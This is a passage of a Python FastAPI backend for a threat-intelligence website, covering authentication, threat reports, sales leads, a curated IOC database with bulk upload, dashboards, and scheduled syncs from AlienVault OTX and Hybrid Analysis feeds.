from dotenv import load_dotenv
from pathlib import Path
import os

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Request, Depends, UploadFile, File
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import logging
from pydantic import BaseModel, Field, ConfigDict, BeforeValidator, EmailStr
from typing import List, Optional, Annotated, Any
import uuid
import asyncio
import re
import csv
import io
import json
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
import httpx
from bson import ObjectId
from openpyxl import load_workbook

# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_ALGORITHM = "HS256"
CISA_FEED_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="NivX Machines API")
api_router = APIRouter(prefix="/api")

# ---------------------------------------------------------------------------
# Model helpers
# ---------------------------------------------------------------------------
PyObjectId = Annotated[str, BeforeValidator(str)]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Auth utils
# ---------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def create_access_token(user_id: str, email: str) -> str:
    payload = {
        "sub": user_id,
        "email": email,
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        user["_id"] = str(user["_id"])
        user.pop("password_hash", None)
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")


# ---------------------------------------------------------------------------
# Pydantic Models
# ---------------------------------------------------------------------------
class LoginInput(BaseModel):
    email: str
    password: str


class ProcessNode(BaseModel):
    name: str
    pid: Optional[str] = None
    cmd: Optional[str] = None
    malicious: bool = False
    children: List["ProcessNode"] = []


class ThreatReportBase(BaseModel):
    title: str
    summary: str
    severity: str = "high"  # critical | high | medium | low
    category: str = "Malware"
    threat_actor: Optional[str] = None
    image_url: Optional[str] = None
    attack_chain: List[str] = []  # MITRE ATT&CK ordered tactics
    iocs: List[str] = []
    process_tree: Optional[ProcessNode] = None
    source: str = "NivX Intel"


class ThreatReportCreate(ThreatReportBase):
    pass


class ThreatReport(ThreatReportBase):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = Field(default_factory=now_iso)
    updated_at: str = Field(default_factory=now_iso)


ProcessNode.model_rebuild()


class LeadCreate(BaseModel):
    name: str
    email: EmailStr
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    website: Optional[str] = None  # honeypot — real users leave blank


class Lead(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str
    email: str
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    status: str = "new"
    notes: Optional[str] = None
    assignee: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)


LEAD_STATUSES = ["new", "contacted", "qualified", "archived"]


class LeadUpdate(BaseModel):
    status: Optional[str] = None
    notes: Optional[str] = None
    assignee: Optional[str] = None


# ---------------------------------------------------------------------------
# Custom IOC database (curated indicators)
# ---------------------------------------------------------------------------
IOC_SEVERITIES = ["low", "medium", "high", "critical"]


def _ioc_key(value: str) -> str:
    """Canonical match key: defanged + lowercased."""
    v = (value or "").strip()
    v = v.replace("[.]", ".").replace("(.)", ".").replace("[dot]", ".").replace("{.}", ".")
    v = v.replace("hxxps", "https").replace("hxxp", "http")
    v = v.replace("[:]", ":")
    return v.lower()


class IocRecordCreate(BaseModel):
    value: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None


class IocRecord(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    value: str
    key: str
    type: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)


class IocBulkCreate(BaseModel):
    values: List[str] = []
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"


class IocBulkDelete(BaseModel):
    ids: List[str] = []


# ---------------------------------------------------------------------------
# Auth routes
# ---------------------------------------------------------------------------
@api_router.post("/auth/login")
async def login(payload: LoginInput):
    email = payload.email.lower().strip()
    user = await db.users.find_one({"email": email})
    if not user or not verify_password(payload.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    token = create_access_token(str(user["_id"]), email)
    return {
        "access_token": token,
        "user": {"id": str(user["_id"]), "email": email, "name": user.get("name", "Admin"), "role": user.get("role", "admin")},
    }


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return {"id": user["_id"], "email": user["email"], "name": user.get("name", "Admin"), "role": user.get("role", "admin")}


# ---------------------------------------------------------------------------
# Threat report routes
# ---------------------------------------------------------------------------
@api_router.get("/threats", response_model=List[ThreatReport])
async def list_threats():
    docs = await db.threat_reports.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return [ThreatReport(**d) for d in docs]


@api_router.get("/threats/{threat_id}", response_model=ThreatReport)
async def get_threat(threat_id: str):
    doc = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return ThreatReport(**doc)


@api_router.post("/threats", response_model=ThreatReport)
async def create_threat(payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    report = ThreatReport(**payload.model_dump())
    await db.threat_reports.insert_one(report.model_dump())
    return report


@api_router.put("/threats/{threat_id}", response_model=ThreatReport)
async def update_threat(threat_id: str, payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    existing = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not existing:
        raise HTTPException(status_code=404, detail="Threat report not found")
    data = payload.model_dump()
    data["updated_at"] = now_iso()
    await db.threat_reports.update_one({"id": threat_id}, {"$set": data})
    merged = {**existing, **data}
    return ThreatReport(**merged)


@api_router.delete("/threats/{threat_id}")
async def delete_threat(threat_id: str, user: dict = Depends(get_current_user)):
    res = await db.threat_reports.delete_one({"id": threat_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Leads (Request a Security Assessment)
# ---------------------------------------------------------------------------
_lead_rate: dict[str, list] = {}
LEAD_RATE_LIMIT = 3          # max submissions
LEAD_RATE_WINDOW = 600       # per 10 minutes (seconds)


def _client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


@api_router.post("/leads", response_model=Lead)
async def create_lead(payload: LeadCreate, request: Request):
    # Honeypot: bots fill hidden 'website' field
    if payload.website:
        logger.info("Lead rejected: honeypot triggered")
        return Lead(name=payload.name, email="honeypot@blocked.local")

    # Simple in-memory IP rate limiting
    ip = _client_ip(request)
    now_ts = datetime.now(timezone.utc).timestamp()
    hits = [t for t in _lead_rate.get(ip, []) if now_ts - t < LEAD_RATE_WINDOW]
    if len(hits) >= LEAD_RATE_LIMIT:
        raise HTTPException(status_code=429, detail="Too many requests. Please try again in a few minutes.")
    hits.append(now_ts)
    _lead_rate[ip] = hits

    data = payload.model_dump(exclude={"website"})
    lead = Lead(**data)
    await db.leads.insert_one(lead.model_dump())
    logger.info(f"New security assessment lead: {lead.email} ({lead.company})")
    return lead


@api_router.get("/leads", response_model=List[Lead])
async def list_leads(user: dict = Depends(get_current_user)):
    docs = await db.leads.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return [Lead(**d) for d in docs]


@api_router.patch("/leads/{lead_id}", response_model=Lead)
async def update_lead(lead_id: str, payload: LeadUpdate, user: dict = Depends(get_current_user)):
    doc = await db.leads.find_one({"id": lead_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Lead not found")
    updates: dict = {}
    if payload.status is not None:
        if payload.status not in LEAD_STATUSES:
            raise HTTPException(status_code=400, detail=f"Invalid status. Allowed: {LEAD_STATUSES}")
        updates["status"] = payload.status
    if payload.notes is not None:
        updates["notes"] = payload.notes
    if payload.assignee is not None:
        updates["assignee"] = payload.assignee
    if not updates:
        raise HTTPException(status_code=400, detail="No fields to update")
    await db.leads.update_one({"id": lead_id}, {"$set": updates})
    return Lead(**{**doc, **updates})


# ---------------------------------------------------------------------------
# Custom IOC database routes (admin-managed, public read)
# ---------------------------------------------------------------------------
def _severity_or_default(s: Optional[str]) -> str:
    s = (s or "").strip().lower()
    return s if s in IOC_SEVERITIES else "medium"


def _parse_tags(t) -> List[str]:
    if isinstance(t, list):
        return [str(x).strip() for x in t if str(x).strip()]
    if isinstance(t, str):
        return [x.strip() for x in re.split(r"[,;|]", t) if x.strip()]
    return []


async def _upsert_ioc(value, threat_name=None, tags=None, source=None, severity="medium", notes=None):
    """Insert or update an IOC by canonical key. Returns (record_dict, created_bool)."""
    value = (value or "").strip()
    if not value:
        return None, False
    key = _ioc_key(value)
    ioc_type = _classify_ioc(value)
    existing = await db.iocs.find_one({"key": key}, {"_id": 0})
    now = now_iso()
    if existing:
        updates: dict = {"updated_at": now}
        if threat_name:
            updates["threat_name"] = threat_name
        if tags:
            updates["tags"] = tags
        if source:
            updates["source"] = source
        if severity:
            updates["severity"] = _severity_or_default(severity)
        if notes:
            updates["notes"] = notes
        await db.iocs.update_one({"key": key}, {"$set": updates})
        return {**existing, **updates}, False
    rec = IocRecord(value=value, key=key, type=ioc_type, threat_name=threat_name, tags=tags or [], source=source, severity=_severity_or_default(severity), notes=notes)
    await db.iocs.insert_one(rec.model_dump())
    return rec.model_dump(), True


@api_router.post("/iocs", response_model=IocRecord)
async def create_ioc(payload: IocRecordCreate, user: dict = Depends(get_current_user)):
    if not payload.value.strip():
        raise HTTPException(status_code=400, detail="IOC value is required")
    if _classify_ioc(payload.value) == "unknown":
        raise HTTPException(status_code=422, detail="Value is not a recognized hash, IP, domain or URL")
    rec, _ = await _upsert_ioc(payload.value, payload.threat_name, _parse_tags(payload.tags), payload.source, payload.severity, payload.notes)
    return IocRecord(**rec)


@api_router.post("/iocs/bulk")
async def bulk_create_iocs(payload: IocBulkCreate, user: dict = Depends(get_current_user)):
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            if tok.strip():
                tokens.append(tok.strip())
    seen = set()
    items: List[str] = []
    for t in tokens:
        k = t.lower()
        if k not in seen:
            seen.add(k)
            items.append(t)
    added = updated = skipped = 0
    tags = _parse_tags(payload.tags)
    for v in items[:5000]:
        if _classify_ioc(v) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(v, payload.threat_name, tags, payload.source, payload.severity)
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(items)}


@api_router.post("/iocs/upload")
async def upload_iocs(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
    name = (file.filename or "").lower()
    content = await file.read()
    rows: List[dict] = []
    try:
        if name.endswith(".xlsx") or name.endswith(".xlsm"):
            wb = load_workbook(io.BytesIO(content), read_only=True, data_only=True)
            ws = wb.active
            headers = None
            for r in ws.iter_rows(values_only=True):
                if headers is None:
                    headers = [str(c).strip().lower() if c is not None else "" for c in r]
                    continue
                rows.append({headers[i]: (r[i] if i < len(r) else None) for i in range(len(headers))})
        elif name.endswith(".csv") or name.endswith(".txt"):
            text = content.decode("utf-8-sig", errors="replace")
            reader = csv.DictReader(io.StringIO(text))
            if reader.fieldnames and any((h or "").strip().lower() in ("value", "ioc", "indicator") for h in reader.fieldnames):
                for row in reader:
                    rows.append({(k or "").strip().lower(): v for k, v in row.items()})
            else:
                for line in text.splitlines():
                    line = line.strip().strip('",')
                    if line:
                        rows.append({"value": line})
        else:
            raise HTTPException(status_code=400, detail="Unsupported file type. Upload .csv, .txt or .xlsx")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Could not parse file: {e}")

    def _get(row, *keys):
        for k in keys:
            if k in row and row[k] not in (None, ""):
                return str(row[k]).strip()
        return None

    added = updated = skipped = 0
    for row in rows[:10000]:
        value = _get(row, "value", "ioc", "indicator")
        if not value or _classify_ioc(value) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(
            value,
            _get(row, "threat_name", "threat", "malware", "label"),
            _parse_tags(_get(row, "tags", "tag")),
            _get(row, "source"),
            _get(row, "severity") or "medium",
            _get(row, "notes", "description", "comment"),
        )
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(rows)}


@api_router.get("/iocs")
async def list_iocs(q: Optional[str] = None, type: Optional[str] = None, severity: Optional[str] = None, tag: Optional[str] = None, limit: int = 100, skip: int = 0):
    query: dict = {}
    if type and type != "all":
        query["type"] = {"$in": ["md5", "sha1", "sha256"]} if type == "hash" else type
    if severity and severity != "all":
        query["severity"] = severity
    if tag:
        query["tags"] = tag
    if q:
        rx = {"$regex": re.escape(q.strip()), "$options": "i"}
        query["$or"] = [{"value": rx}, {"threat_name": rx}, {"tags": rx}, {"source": rx}, {"notes": rx}]
    total = await db.iocs.count_documents(query)
    limit = max(1, min(limit, 500))
    docs = await db.iocs.find(query, {"_id": 0}).sort("created_at", -1).skip(max(0, skip)).limit(limit).to_list(limit)
    return {"total": total, "items": docs, "limit": limit, "skip": skip}


@api_router.get("/iocs/stats")
async def ioc_stats():
    total = await db.iocs.count_documents({})
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    return {"total": total, "by_severity": by_severity}


@api_router.delete("/iocs/bulk")
async def bulk_delete_iocs(payload: IocBulkDelete, user: dict = Depends(get_current_user)):
    if not payload.ids:
        raise HTTPException(status_code=400, detail="No IOC ids provided")
    res = await db.iocs.delete_many({"id": {"$in": payload.ids}})
    return {"deleted": res.deleted_count}


@api_router.delete("/iocs/{ioc_id}")
async def delete_ioc(ioc_id: str, user: dict = Depends(get_current_user)):
    res = await db.iocs.delete_one({"id": ioc_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="IOC not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Admin SOC Overview — aggregated operational dashboard (auth required)
# ---------------------------------------------------------------------------
@api_router.get("/admin/overview")
async def admin_overview(user: dict = Depends(get_current_user)):
    """Consolidated SOC dashboard: IOC stats, lead pipeline, OTX sync,
    recent activity, provider status. Powers the Admin > Overview tab."""
    # IOCs
    ioc_total = await db.iocs.count_documents({})
    ioc_by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    ioc_by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        ioc_by_type[t] = await db.iocs.count_documents({"type": t})
    ioc_by_type["hash"] = ioc_by_type.pop("md5", 0) + ioc_by_type.pop("sha1", 0) + ioc_by_type.pop("sha256", 0)

    # Leads pipeline
    lead_total = await db.leads.count_documents({})
    lead_by_status = {s: await db.leads.count_documents({"status": s}) for s in LEAD_STATUSES}
    # Leads added in last 7 days (using created_at ISO string comparison since we store ISO)
    seven_days_ago = (datetime.now(timezone.utc) - timedelta(days=7)).isoformat()
    lead_week = await db.leads.count_documents({"created_at": {"$gte": seven_days_ago}})

    # Threat reports
    reports_total = await db.threat_reports.count_documents({})

    # OTX
    otx_meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Recent activity
    recent_leads = await db.leads.find({}, {"_id": 0, "id": 1, "name": 1, "email": 1, "company": 1, "status": 1, "assignee": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_iocs = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_reports = await db.threat_reports.find({}, {"_id": 0, "id": 1, "title": 1, "severity": 1, "category": 1, "created_at": 1}).sort("created_at", -1).limit(5).to_list(5)

    # Top malware families (from IOC tags) — reuse aggregation
    fam_pipeline = [
        {"$unwind": "$tags"},
        {"$match": {"tags": {"$regex": "^family:", "$options": "i"}}},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 5},
    ]
    fam_docs = await db.iocs.aggregate(fam_pipeline).to_list(5)
    top_families = [{"name": d["_id"].split(":", 1)[1] if ":" in d["_id"] else d["_id"], "count": d["count"]} for d in fam_docs]

    return {
        "iocs": {"total": ioc_total, "by_severity": ioc_by_severity, "by_type": ioc_by_type},
        "leads": {"total": lead_total, "by_status": lead_by_status, "last_7_days": lead_week},
        "reports": {"total": reports_total},
        "otx": {"configured": bool(OTX_API_KEY), "last_sync": otx_meta},
        "recent": {"leads": recent_leads, "iocs": recent_iocs, "reports": recent_reports},
        "top_families": top_families,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
        "generated_at": now_iso(),
    }


# ---------------------------------------------------------------------------
# Threat Intelligence overview (aggregated stats for the /threat-intelligence hub)
# ---------------------------------------------------------------------------
@api_router.get("/threat-intel/overview")
async def threat_intel_overview():
    """Aggregated intel: totals by type/severity, top adversaries, top malware
    families, top sources, and last OTX sync — powers the CrowdStrike-style
    Threat Intel Overview band on the frontend."""
    total = await db.iocs.count_documents({})
    by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        by_type[t] = await db.iocs.count_documents({"type": t})
    by_type["hash"] = by_type.pop("md5", 0) + by_type.pop("sha1", 0) + by_type.pop("sha256", 0)
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    otx = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Top adversary/family tags — tags stored as "actor:X" or "family:X".
    pipeline_tag = [
        {"$unwind": "$tags"},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 60},
    ]
    tag_docs = await db.iocs.aggregate(pipeline_tag).to_list(60)
    adversaries, families, top_tags = [], [], []
    for d in tag_docs:
        tag = (d.get("_id") or "").strip()
        if not tag:
            continue
        entry = {"name": tag.split(":", 1)[1] if ":" in tag else tag, "count": d.get("count", 0)}
        if tag.lower().startswith("actor:"):
            adversaries.append(entry)
        elif tag.lower().startswith("family:"):
            families.append(entry)
        else:
            top_tags.append(entry)

    # Top threat_name (malware campaign / pulse title) — separate from family tags.
    pipeline_threat = [
        {"$match": {"threat_name": {"$ne": None, "$exists": True}}},
        {"$group": {"_id": "$threat_name", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 10},
    ]
    tn_docs = await db.iocs.aggregate(pipeline_threat).to_list(10)
    top_campaigns = [{"name": d["_id"], "count": d["count"]} for d in tn_docs if d.get("_id")]

    # Top sources (short label — strip pulse suffix)
    pipeline_src = [
        {"$match": {"source": {"$ne": None, "$exists": True}}},
        {"$project": {"source": {"$arrayElemAt": [{"$split": ["$source", " · "]}, 0]}}},
        {"$group": {"_id": "$source", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 8},
    ]
    src_docs = await db.iocs.aggregate(pipeline_src).to_list(8)
    top_sources = [{"name": d["_id"], "count": d["count"]} for d in src_docs if d.get("_id")]

    # Recent additions
    recent = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(8).to_list(8)

    return {
        "total_iocs": total,
        "by_type": by_type,
        "by_severity": by_severity,
        "adversaries": adversaries[:10],
        "malware_families": families[:10],
        "top_campaigns": top_campaigns,
        "top_sources": top_sources,
        "top_tags": top_tags[:12],
        "recent": recent,
        "last_otx_sync": otx,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
    }


# ---------------------------------------------------------------------------
# AlienVault OTX threat intelligence sync (auto on startup + daily)
# ---------------------------------------------------------------------------
OTX_API_KEY = os.environ.get("OTX_API_KEY")
OTX_BASE = "https://otx.alienvault.com/api/v1"
OTX_MAX_PULSES = 50
OTX_MAX_INDICATORS = 500
OTX_SYNC_INTERVAL_SEC = 24 * 60 * 60  # daily

# OTX indicator type -> normalized value / (skip if returns None)
def _otx_indicator_value(otx_type: str, indicator: str) -> Optional[str]:
    t = (otx_type or "").strip()
    v = (indicator or "").strip()
    if not v:
        return None
    if t in ("IPv4", "IPv6"):
        return v if _classify_ioc(v) == "ip" else None
    if t in ("domain", "hostname"):
        return v if _classify_ioc(v) == "domain" else None
    if t in ("URL", "URI"):
        return v if _classify_ioc(v) == "url" else None
    if t == "FileHash-MD5":
        return v if _classify_ioc(v) == "md5" else None
    if t == "FileHash-SHA1":
        return v if _classify_ioc(v) == "sha1" else None
    if t == "FileHash-SHA256":
        return v if _classify_ioc(v) == "sha256" else None
    return None


def _otx_severity(pulse: dict) -> str:
    """OTX pulses are curated threat intel — default to 'medium'. Escalate if
    the pulse carries strong indicators (malware families, adversary attribution
    or explicit high-confidence tags)."""
    tags_lower = {str(t).lower() for t in (pulse.get("tags") or [])}
    has_malware = bool(pulse.get("malware_families"))
    has_actor = bool((pulse.get("adversary") or "").strip())
    if any(k in tags_lower for k in ("ransomware", "apt", "zero-day", "0day", "wiper")):
        return "critical"
    if has_malware and has_actor:
        return "high"
    if has_malware or has_actor:
        return "high"
    return "medium"


async def _sync_otx_pulses(max_pulses: int = OTX_MAX_PULSES, max_indicators: int = OTX_MAX_INDICATORS) -> dict:
    """Fetch subscribed OTX pulses and upsert their indicators into db.iocs.

    Returns a summary dict: {pulses, indicators, added, updated, skipped, error?}.
    """
    if not OTX_API_KEY:
        return {"error": "OTX_API_KEY not configured", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}

    headers = {"X-OTX-API-KEY": OTX_API_KEY, "User-Agent": "NivX-Machines/1.0"}
    pulses: List[dict] = []
    added = updated = skipped = ind_count = 0
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            # Page through subscribed pulses until we hit max_pulses.
            page = 1
            while len(pulses) < max_pulses and page <= 5:
                r = await hc.get(f"{OTX_BASE}/pulses/subscribed", params={"limit": 50, "page": page}, headers=headers)
                if r.status_code != 200:
                    return {"error": f"OTX fetch failed ({r.status_code})", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}
                data = r.json() or {}
                results = data.get("results") or []
                if not results:
                    break
                pulses.extend(results)
                if not data.get("next"):
                    break
                page += 1
            pulses = pulses[:max_pulses]

            for pulse in pulses:
                if ind_count >= max_indicators:
                    break
                threat_name = (pulse.get("name") or "").strip() or None
                severity = _otx_severity(pulse)
                tags = [str(t).strip() for t in (pulse.get("tags") or []) if str(t).strip()][:20]
                # Include adversary + malware family as tags when present.
                if pulse.get("adversary"):
                    tags.append(f"actor:{pulse['adversary']}")
                for fam in (pulse.get("malware_families") or [])[:5]:
                    fname = fam.get("display_name") if isinstance(fam, dict) else str(fam)
                    if fname:
                        tags.append(f"family:{fname}")
                # De-dup tags (case-insensitive)
                _seen = set()
                _dedup = []
                for t in tags:
                    tl = t.lower()
                    if tl not in _seen:
                        _seen.add(tl)
                        _dedup.append(t)
                tags = _dedup
                pulse_ref = pulse.get("id")
                source = f"AlienVault OTX · {pulse_ref}" if pulse_ref else "AlienVault OTX"
                for ind in pulse.get("indicators") or []:
                    if ind_count >= max_indicators:
                        break
                    ind_count += 1
                    value = _otx_indicator_value(ind.get("type"), ind.get("indicator"))
                    if not value:
                        skipped += 1
                        continue
                    notes = None
                    if pulse.get("description"):
                        notes = (pulse["description"] or "").strip()[:400] or None
                    try:
                        _, created = await _upsert_ioc(value, threat_name, tags, source, severity, notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception as e:
                        logger.warning(f"OTX upsert failed for {value}: {e}")
                        skipped += 1
    except Exception as e:
        logger.error(f"OTX sync error: {e}")
        return {"error": f"OTX sync error: {e}", "pulses": len(pulses), "indicators": ind_count, "added": added, "updated": updated, "skipped": skipped}

    summary = {
        "pulses": len(pulses),
        "indicators": ind_count,
        "added": added,
        "updated": updated,
        "skipped": skipped,
        "synced_at": now_iso(),
    }
    try:
        await db.otx_meta.update_one({"_id": "last_sync"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"OTX sync complete: {summary}")
    return summary


@api_router.get("/otx/status")
async def otx_status():
    meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    return {"configured": bool(OTX_API_KEY), "last_sync": meta}


@api_router.post("/otx/sync")
async def otx_sync(user: dict = Depends(get_current_user)):
    if not OTX_API_KEY:
        raise HTTPException(status_code=503, detail="AlienVault OTX is not configured")
    summary = await _sync_otx_pulses()
    if summary.get("error"):
        raise HTTPException(status_code=502, detail=summary["error"])
    return summary


async def _otx_sync_loop():
    """Runs on startup + every OTX_SYNC_INTERVAL_SEC seconds."""
    # First delay a bit so the app finishes booting.
    await asyncio.sleep(15)
    while True:
        try:
            await _sync_otx_pulses()
        except Exception as e:
            logger.error(f"OTX loop error: {e}")
        await asyncio.sleep(OTX_SYNC_INTERVAL_SEC)


BULK_IOC_SYNC_INTERVAL_SEC = 2 * 60 * 60  # 2 hours — refreshes the whole IOC DB on a rolling window


async def _bulk_ioc_sync_loop():
    """Refreshes every bulk-IOC source (Hybrid Analysis, AbuseIPDB, MalwareBazaar,
    Malwarebytes, VT Enterprise if a key is present, and the Talos community
    blocklists) on a fixed cadence so the curated IOC DB and dashboard numbers
    stay fresh without any manual click."""
    await asyncio.sleep(45)  # let OTX go first + app fully warm
    while True:
        try:
            tasks = [
                _sync_hybrid_analysis_feed() if HYBRID_ANALYSIS_API_KEY else None,
                _sync_abuseipdb_blacklist()   if ABUSEIPDB_API_KEY       else None,
                _sync_malwarebazaar_recent()  if MALWAREBAZAAR_API_KEY   else None,
                _sync_malwarebytes_iocs(),
                _sync_virustotal_intel()      if VT_API_KEY              else None,
                _sync_talos_blocklist(),
            ]
            active = [t for t in tasks if t is not None]
            await asyncio.gather(*active, return_exceptions=True)
            logger.info("Bulk-IOC scheduled sync loop iteration complete")
        except Exception as e:
            logger.error(f"Bulk-IOC loop error: {e}")
        await asyncio.sleep(BULK_IOC_SYNC_INTERVAL_SEC)


# ---------------------------------------------------------------------------
# Hybrid Analysis "latest feed" sync — pulls last 250 sandbox submissions
# and upserts their SHA256 hashes into the curated IOC database.
# ---------------------------------------------------------------------------
HA_FEED_URL = "https://www.hybrid-analysis.com/api/v2/feed/latest"
HA_FEED_MAX = 250


def _ha_severity(item: dict) -> str:
    verdict = str(item.get("verdict") or "").lower()
    threat_level = int(item.get("threat_level") or 0)
    threat_score = int(item.get("threat_score") or 0)
    if verdict == "malicious" or threat_level >= 2 or threat_score >= 80:
        return "critical"
    if verdict == "suspicious" or threat_level == 1 or threat_score >= 50:
        return "high"
    if threat_score >= 20:
        return "medium"
    return "low"


async def _sync_hybrid_analysis_feed(max_items: int = HA_FEED_MAX) -> dict:
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "HYBRID_ANALYSIS_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(HA_FEED_URL, headers={"api-key": HYBRID_ANALYSIS_API_KEY, "User-Agent": "Falcon Sandbox", "Accept": "application/json"})
            if r.status_code != 200:
                return {"error": f"Hybrid Analysis feed failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            data = payload.get("data") if isinstance(payload, dict) else payload
            items = (data or [])[:max_items] if isinstance(data, list) else []
